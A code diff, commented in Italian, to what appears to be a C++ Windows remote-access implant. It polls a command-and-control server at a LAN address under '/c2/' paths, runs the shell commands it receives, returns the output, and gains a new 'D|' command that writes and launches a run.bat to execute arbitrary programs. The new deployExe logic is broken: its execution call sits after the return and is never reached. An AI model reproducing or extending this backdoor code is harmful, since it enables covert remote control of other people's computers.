@@ -25,17 +25,12 @@ bool sendHttpRequests(const string& address, const string& page, string& respons
 void hideWindow();
 string URLEncode(const string& value);
 bool deployExe(string path);
-bool closeExe();
 
 
-string server = "localhost";
+string server = "192.168.1.204";
 string shellNo = "0";
-string shellFilePath = "/shell"+shellNo+".txt";
-string outputPagePath = "/output.php";
-
-//creo un puntatore nullo (per ora) che punta alle informazioni dell'eseguibile estern che viene avviato
-//mi permette di poter recuperare le informazioni della variabile originale (pi in deployExe())
-PROCESS_INFORMATION * externalExeProcessInformations = nullptr;
+string shellFilePath = "/c2/shell"+shellNo+".txt";
+string outputPagePath = "/c2/output.php";
 
 
 int main(){
@@ -48,8 +43,21 @@ int main(){
     while (true){
 
         command = getCommand(server, shellFilePath);
-        
-        if(command != ""){
+
+        if(command.substr(0, 2) == "D|"){
+
+            //metto in command il nome dell'eseguibile
+            command = command.substr(2, command.size());
+
+            if(deployExe(command)){
+                sendOutput(server, outputPagePath, "programma eseguito con successo");
+            }
+            else{
+                sendOutput(server, outputPagePath, "errore durante l'esecuzione del programma");
+            }
+
+        }
+        else if(command != ""){
             
             result = ExecuteCommand(command);
             if(result==""){
@@ -109,10 +117,16 @@ string getCommand(const string& address, const string& page){
     index = response.find_last_of(';');
 
     if(response[index+1] == '-'){
-
+    
         return "";
 
     }
+    else if(response[index+1] == ';'){
+
+        return "D|"+response.substr(index+1, response.size());
+
+    }
+
     return response.substr(index+1, response.size());
     //prende l'ultima riga che corrisponde al comando da eseguire
     //questo per mantenere uno storico
@@ -121,64 +135,22 @@ string getCommand(const string& address, const string& page){
 
 bool deployExe(string path){
 
-    // Strutture per gestire il processo
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
+    string payload = "@echo off\n"
+                     "start \"\" \"" + path + "\"\n"
+                     "exit\n";
 
-    if(externalExeProcessInformations == nullptr){
-
-        // Inizializza STARTUPINFO e PROCESS_INFORMATION
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        ZeroMemory(&pi, sizeof(pi));
-
-        // Crea il processo
-        if(CreateProcess(
-            path,               // Nome eseguibile
-            NULL,               // Parametri della riga di comando
-            NULL,               // Sicurezza del processo
-            NULL,               // Sicurezza del thread
-            FALSE,              // Non ereditare gli handle
-            CREATE_NO_WINDOW,   // Flag di creazione (no finestra)
-            NULL,               // Variabili d'ambiente
-            NULL,               // Directory di lavoro
-            &si,                // Info startup
-            &pi                 // Info processo
-        )){
-
-            //Aggiorno il puntatore con l'indirizzo delle informazioni del processo
-            externalExeProcessInformations = &pi;
-            return true;
-
-        }
-
+    // Scrivi il contenuto nel file run.bat
+    ofstream outFile("run.bat");
+    if (outFile.is_open()) {
+        outFile << payload;  // Scrivi il payload nel file
+        outFile.close();     // Chiudi il file
+        return true;
+    } else {
+        return false;
     }
-
-    return false;
+    ExecuteCommand("run.bat");
 }
 
-bool closeExe(){
-
-    if(externalExeProcessInformations != nullptr){
-
-        if (TerminateProcess(pi.hProcess, 0)) {
-
-            // Termina il processo e chiude gli handle
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-
-            //azzero il puntatore
-            externalExeProcessInformations = nullptr;
-
-            return true;
-
-        }
-
-    }
-
-    return false
-
-}
 
 void sendOutput(const string& address, const string& page, const string& output){
 
